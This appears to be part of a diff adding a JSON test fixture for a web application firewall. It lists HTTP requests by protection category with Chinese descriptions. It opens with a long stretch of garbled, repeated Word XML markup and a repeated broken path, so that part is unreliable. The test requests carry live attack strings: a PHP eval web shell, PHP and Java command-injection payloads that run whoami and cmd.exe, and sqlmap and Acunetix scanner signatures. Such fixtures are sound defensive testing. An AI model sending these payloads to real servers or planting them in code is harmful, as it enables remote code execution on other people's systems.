oGridInCell/><w:WrapTextWithPunct/><w:UseAsianBreakRules><w:DontGrowAutofit/><w:SplitPgBreakAndParaMark/><w:DontVertAlignCellWithSp/><w:DontBreakConstrainedForcedTables/<w:DontVertAlignInTxbx/><w:Word11KerningPairs/><w:CachedColBalance/><w:UseFELayout/></w:Compatibility><m:mathPr><m:mathFontm:val=\"CambriaMath\"/><m:brkBinm:val=\"before\"/><m:brkBinSubm:val=\"&#45;-\"/><m:smallFracm:val=\"off\"/><m:dispDef/><w:DisplayHorizontalDrawingGridEvery>0</w:DisplayHorizontalDrawingGridEvery>w:DisplayVerticalDrawingGridEvery>2</w:DisplayVerticalDrawingGridEvery><w:ValidateAgainstSchemas/><w:SaveIfXMLInvalid>false</w:SaveIfXMLInvalid><w:IgnoreMiedContent>false</w:IgnoreMixedContent><w:AlwaysShowPlaceholderText>false</wAlwaysShowPlaceholderText><w:DoNotPromoteQF/><w:LidThemeOther>EN-US</w:LidThemeOther><w:LidThemeAsian>ZH-CN</w:LidThemeAsian><w:LidThemeCompleScript>X-NONE</w:LidThemeComplexScript><w:Compatibility><w:SpaceForUL/><w:BalanceSingleByteDoubleByteWidth/><w:DoNotLeaveBackslashAlone/><w:ULTrailSace/><w:DoNotExpandShiftReturn/><w:AdjustLineHeightInTable/><w:BreakWrappdTables/><w:SnapToGridInCell/><w:WrapTextWithPunct/><w:UseAsianBreakRules><w:DontGrowAutofit/><w:SplitPgBreakAndParaMark/><w:DontVertAlignCellWithSp/><w:DontBreakConstrainedForcedTables/><w:DontVertAlignInTxbx/><w:Word11KeningPairs/><w:CachedColBalance/><w:UseFELayout/></w:Compatibility><m:mathPr><m:mathFontm:val=\"CambriaMath\"/><m:brkBinm:val=\"before\"/><m:brkBinSubm:val=\"&#45;-\"/><m:smallFracm:val=\"off\"/><m:dispDef/><w:DisplayHorizontalDrawingGridEvey>0</w:DisplayHorizontalDrawingGridEvery><w:DisplayVerticalDrawingGridEvery>2</w:DisplayVerticalDrawingGridEvery><w:ValidateAgainstSchemas/><w:SaveIfXMLInvalid>false</w:SaveIfXMLInvalid><w:IgnoreMixedContent>false</w:IgnoreMixedContent><w:AlwaysShowPlaceholderText>false</w:AlwaysShowPlaceholderText><w:DoNotPromoteQF/><w:LidThemeOther>EN-US</w:LidThemeOther><w:LidThemeAsian>ZH-CN</w:LidThemeAsian><w:LidThemeComplexScript>X-NONE</w:LidThemeComplexScript><w:Compatibility><w:SpaceForUL/><w:BalanceSingleByteDoubleByteWidth/<w:DoNotLeaveBackslashAlone/><w:ULTrailSpace/><w:DoNotExpandShiftReturn/><:AdjustLineHeightInTable/><w:BreakWrappedTables/><w:SnapToGridInCell/><w:WrapTextWithPunct/><w:UseAsianBreakRules><w:DontGrowAutofit/><w:SplitPgBreakAndParaMark/><w:DontVertAlignCellWithSp/><w:DontBreakConstrainedForcedTables/<w:DontVertAlignInTxbx/><w:Word11KerningPairs/><w:CachedColBalance/><w:UseFELayout/></w:Compatibility><m:mathPr><m:mathFontm:val=\"CambriaMath\"/><m:brkBinm:val=\"before\"/><m:brkBinSubm:val=\"&#45;-\"/><m:smallFracm:val=\"off\"/><m:dispDef/><w:DisplayHorizontalDrawingGridEvery>0</w:DisplayHorizontalDrawingGridEvery>w:DisplayVerticalDrawingGridEvery>2</w:DisplayVerticalDrawingGridEvery><w:ValidateAgainstSchemas/><w:SaveIfXMLInvalid>false</w:SaveIfXMLInvalid><w:IgnoreMiedContent>false</w:IgnoreMixedContent><w:AlwaysShowPlaceholderText>false</wAlwaysShowPlaceholderText><w:DoNotPromoteQF/><w:LidThemeOther>EN-US</w:LidThemeOther><w:LidThemeAsian>ZH-CN</w:LidThemeAsian><w:LidThemeCompleScript>X-NONE</w:LidThemeComplexScript><w:Compatibility><w:SpaceForUL/><w:BalanceSingleByteDoubleByteWidth/><w:DoNotLeaveBackslashAlone/><w:ULTrailSace/><w:DoNotExpandShiftReturn/><w:AdjustLineHeightInTable/><w:BreakWrappdTables/><w:SnapToGridInCell/><w:WrapTextWithPunct/><w:UseAsianBreakRules><w:DontGrowAutofit/><w:SplitPgBreakAndParaMark/><w:DontVertAlignCellWithSp/><w:DontBreakConstrainedForcedTables/><w:DontVertAlignInTxbx/><w:Word11KeningPairs/><w:CachedColBalance/><w:UseFELayout/></w:Compatibility><m:mathPr><m:mathFontm:val=\"CambriaMath\"/><m:brkBinm:val=\"before\"/><m:brkBinSubm:val=\"&#45;-\"/><m:smallFracm:val=\"off\"/><m:dispDef/><w:DisplayHorizontalDrawingGridEvey>0</w:DisplayHorizontalDrawingGridEvery><w:DisplayVerticalDrawingGridEvery>2</w:DisplayVerticalDrawingGridEvery><w:ValidateAgainstSchemas/><w:SaveIfXMLInvalid>false</w:SaveIfXMLInvalid><w:IgnoreMixedContent>false</w:IgnoreMixedContent><w:AlwaysShowPlaceholderText>false</w:AlwaysShowPlaceholderText><w:DoNotPromoteQF/><w:LidThemeOther>EN-US</w:LidThemeOther><w:LidThemeAsian>ZH-CN</w:LidThemeAsian><w:LidThemeComplexScript>X-NONE</w:LidThemeComplexScript><w:Compatibility><w:SpaceForUL/><w:BalanceSingleByteDoubleByteWidth/<w:DoNotLeaveBackslashAlone/><w:ULTrailSpace/><w:DoNotExpandShiftReturn/><:AdjustLineHeightInTable/><w:BreakWrappedTables/><w:SnapToGridInCell/><w:WrapTextWithPunct/><w:UseAsianBreakRules><w:DontGrowAutofit/><w:SplitPgBreakAndParaMark/><w:DontVertAlignCellWithSp/><w:DontBreakConstrainedForcedTables/<w:DontVertAlignInTxbx/><w:Word11KerningPairs/><w:CachedColBalance/><w:UseFELayout/></w:Compatibility><m:mathPr><m:mathFontm:val=\"CambriaMath\"/><m:brkBinm:val=\"before\"/><m:brkBinSubm:val=\"&#45;-\"/><m:smallFracm:val=\"off\"/><m:dispDef/>py/bigcookie.php/py/bigcookie.php/py/bigcookie.php/py/bigcookie.php/py/bigcookie.php/py/bigcookie.php/py/bigcookie.php/py/bigcookie.php/py/bigcookie.php/py/bigcookie.php/py/bigcookie.php/integrate.php?act=sync&del_list=<?php%20eval($_POST[cmd])?>",
+        "headers": {
+          "Host": "127.0.0.1",
+          "User-Agent": "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)",
+          "Connection": "close",
+          "Content-Length": "0"
+        },
+        "body": null
+      }
+    ]
+  },
+  "http_acl": {
+    "0": [
+      {
+        "method": "put",
+        "urlpath": "/py/index.php",
+        "headers": {
+          "Host": "127.0.0.1",
+          "User-Agent": "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)",
+          "Connection": "close",
+          "Content-Length": "0"
+        },
+        "body": null
+      }
+    ],
+    "1": [
+      {
+        "method": "get",
+        "urlpath": "/py/index.php",
+        "headers": {
+          "Host": "127.0.0.1",
+          "User-Agent": "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)",
+          "Connection": "close",
+          "Content-Length": "0"
+        },
+        "body": null
+      }
+    ]
+  },
+  "download_limit": {
+    "0": [
+      {
+        "desc": "flag需要拼接在参数上才可以生效。",
+        "method": "get",
+        "urlpath": "/py/download/test.sql",
+        "headers": {
+          "Host": "127.0.0.1",
+          "User-Agent": "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)",
+          "Connection": "close",
+          "Content-Length": "0"
+        },
+        "body": null
+      }
+    ],
+     "1": [
+      {
+        "desc": "flag需要拼接在参数上才可以生效。",
+        "method": "get",
+        "urlpath": "/py/download/178k.conf",
+        "headers": {
+          "Host": "127.0.0.1",
+          "User-Agent": "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)",
+          "Connection": "close",
+          "Content-Length": "0"
+        },
+        "body": null
+      }
+    ]
+  },
+  "anti_leech": {
+    "0": [
+      {
+        "method": "get",
+        "urlpath": "/py/img/help.gif",
+        "headers": {
+          "Host": "127.0.0.1",
+          "User-Agent": "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)",
+          "Connection": "close",
+          "Content-Length": "0",
+          "Referer": "http://156.169.1.1:82/py/img/help.gif"
+        },
+        "body": null
+      }
+    ]
+  },
+  "custom_policy": {
+    "0": [
+      {
+        "method": "get",
+        "urlpath": "/py/index.php",
+        "headers": {
+          "Host": "127.0.0.1",
+          "User-Agent": "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)",
+          "Connection": "close",
+          "Content-Length": "0",
+          "Cookie": "PHPSESSID=8ZFu_VnCQR-8rUlBx8JvQlaGb3axtSFtK_slkFqAQmx4NWm_8J2Klg"
+        },
+        "body": null
+      }
+    ]
+  },
+  "spider_anti": {
+    "0": [
+      {
+        "method": "get",
+        "urlpath": "/py/index.php",
+        "headers": {
+          "Host": "127.0.0.1",
+          "User-Agent": "Arachmo",
+          "Connection": "close",
+          "Content-Length": "0"
+        },
+        "body": null
+      }
+    ],
+    "1": [
+      {
+        "method": "get",
+        "urlpath": "/py/index.php",
+        "headers": {
+          "Host": "127.0.0.1",
+          "User-Agent": "Mozilla/5.0 (Windows; U; Windows NT 5.2; zh-CN; rv:1.9.2.23) Gecko/20110920 zspider Firefox/3.6.23 http://misc.yahoo.com.cn/help.html)",
+          "Connection": "close",
+          "Content-Length": "0"
+        },
+        "body": null
+      }
+    ]
+  },
+  "sensitiveinfo_filter": {
+    "1": [
+      {
+        "method": "get",
+        "urlpath": "/py/id/idbig5.html",
+        "headers": {
+          "Host": "127.0.0.1",
+          "User-Agent": "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)",
+          "Connection": "close",
+          "Content-Length": "0"
+        },
+        "body": null
+      }
+    ],
+    "9437191": [
+      {
+        "method": "get",
+        "urlpath": "/py/id/idbig5.html",
+        "headers": {
+          "Host": "127.0.0.1",
+          "User-Agent": "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)",
+          "Connection": "close",
+          "Content-Length": "0"
+        },
+        "body": null
+      }
+    ],
+    "0": [
+      {
+        "method": "get",
+        "urlpath": "/py/id/idgb2312.html",
+        "headers": {
+          "Host": "127.0.0.1",
+          "User-Agent": "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)",
+          "Connection": "close",
+          "Content-Length": "0"
+        },
+        "body": null
+      }
+    ]
+  },
+  "scan_anti": {
+    "0": [
+      {
+        "desc": "扫描防护-sqlmap",
+        "method": "get",
+        "urlpath": "/py/index.php",
+        "headers": {
+          "Host": "127.0.0.1",
+          "User-Agent": "Mozilla/4.0 sqlmap.org (compatible; MSIE 6.0; Windows NT 5.1)",
+          "Connection": "close",
+          "Content-Length": "0"
+        },
+        "body": null
+      }
+    ],
+    "1": [
+      {
+        "desc": "扫描防护-NSFOCUS_RSAS",
+        "method": "get",
+        "urlpath": "/py/index.php",
+        "headers": {
+          "Host": "127.0.0.1",
+          "User-Agent": "Mozilla/4.75 (X11, U; Rsas)",
+          "Connection": "close",
+          "Content-Length": "0"
+        },
+        "body": null
+      }
+    ],
+    "2": [
+      {
+        "desc": "扫描防护-Nmap_Scripting_Engine",
+        "method": "get",
+        "urlpath": "/py/index.php",
+        "headers": {
+          "Host": "127.0.0.1",
+          "User-Agent": "Mozilla/4.75 (compatible; Nmap Scripting Engine; http://nmap.org/book/nse.html)",
+          "Connection": "close",
+          "Content-Length": "0"
+        },
+        "body": null
+      }
+    ],
+    "3": [
+      {
+        "desc": "扫描防护-Acunetix_Web_Vulnerability_Scanner",
+        "method": "get",
+        "urlpath": "/py/index.php",
+        "headers": {
+          "Host": "127.0.0.1",
+          "User-Agent": "Mozilla/4.75 (acunetix_wvs_security_test)",
+          "Connection": "close",
+          "Content-Length": "0"
+        },
+        "body": null
+      }
+    ]
+  },
+  "http_flood": {
+    "0": [
+      {
+        "desc": "http flood防护，只需要正常获取内容即可",
+        "method": "get",
+        "urlpath": "/py/index.php",
+        "headers": {
+          "Host": "127.0.0.1",
+          "User-Agent": "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)",
+          "Connection": "close",
+          "Content-Length": "0"
+        },
+        "body": null
+      }
+    ],
+    "1": [
+      {
+        "desc": "http flood防护，只需要正常获取内容即可",
+        "method": "post",
+        "urlpath": "/py/index.php",
+        "headers": {
+          "Host": "127.0.0.1",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "*/*",
+          "Accept-Language": "en",
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36",
+          "Connection": "close",
+          "Content-Type": "application/x-www-form-urlencoded",
+          "Content-Length": "53"
+        },
+        "body": "a=1"
+      }
+    ]
+  },
+  "info_leak": {
+    "0": [
+      {
+        "desc": "信息泄漏防护",
+        "method": "get",
+        "urlpath": "/py/infoleak/index.php?code=500",
+        "headers": {
+          "Host": "127.0.0.1",
+          "User-Agent": "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)",
+          "Connection": "close",
+          "Content-Length": "0"
+        },
+        "body": null
+      }
+    ],
+    "1": [
+      {
+        "desc": "信息泄漏防护",
+        "method": "get",
+        "urlpath": "/py/infoleak/index.php?code=403",
+        "headers": {
+          "Host": "127.0.0.1",
+          "User-Agent": "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)",
+          "Connection": "close",
+          "Content-Length": "0"
+        },
+        "body": null
+      }
+    ]
+  },
+  "cookie_sec": {
+    "0": [
+      {
+        "method": "get",
+        "urlpath": "/py/index.php",
+        "headers": {
+          "Host": "127.0.0.1",
+          "User-Agent": "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)",
+          "Connection": "close",
+          "Content-Length": "0",
+          "Cookie": "NumVisitsPhp=19PhuvxvKa1__-UhDm5st; PHPSESSID=8ZFu_VnCQR-8rUlBx8JvQlaGb3axtSFtK_slkFqAQmx4NWm_8J2Klg**"
+        },
+        "body": null
+      }
+    ]
+  },
+  "xml_firewall": {
+    "0": [
+      {
+        "method": "get",
+        "urlpath": "/py/index.php",
+        "headers": {
+          "Host": "127.0.0.1",
+          "User-Agent": "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)",
+          "Connection": "close",
+          "Content-Length": "0",
+          "Content-Type": "application/xml"
+        },
+        "body": "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<root>\n<a><a><a><a><a><a><a><a><a><a><a><a><a><a><a><a><a><a><a><a><a><a><a>\n<b>456</b>\n<b>23</b>\n<b>45644</b>\n</a></a></a></a></a></a></a></a></a></a></a></a></a></a></a></a></a></a></a></a></a></a></a>\n</root>\n"
+      }
+    ],
+    "100": [
+      {
+        "desc": "XML 攻击防护模板",
+        "method": "post",
+        "urlpath": "/py/xml/",
+        "headers": {
+          "Host": "127.0.0.1",
+          "User-Agent": "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)",
+          "Connection": "close",
+          "Content-Length": "0",
+          "Content-Type": "application/xml"
+        },
+        "body": ""
+      }
+    ]
+  },
+  "php_code_injection": {
+    "0": [
+      {
+        "desc": "php代码注入攻击",
+        "method": "get",
+        "urlpath": "/?param=exec('whoami')",
+        "headers": {
+        "Host": "127.0.0.1",
+          "User-Agent": "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)",
+          "Connection": "close",
+          "Content-Length": "0"
+        },
+        "body": null
+      }
+    ]
+  },
+  "java_code_injection": {
+    "0": [
+      {
+        "desc": "java代码注入攻击",
+        "method": "get",
+        "urlpath": "/?param=+Process+p+%3d+Runtime.getRuntime().exec(\"cmd.exe+/c+\"+%2b+request.getParameter(\"cmd\"))",
+        "headers": {
+        "Host": "127.0.0.1",
+          "User-Agent": "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)",
+          "Connection": "close",
+          "Content-Length": "0"
+        },
+        "body": null
+      }
+    ]
+  }
+}
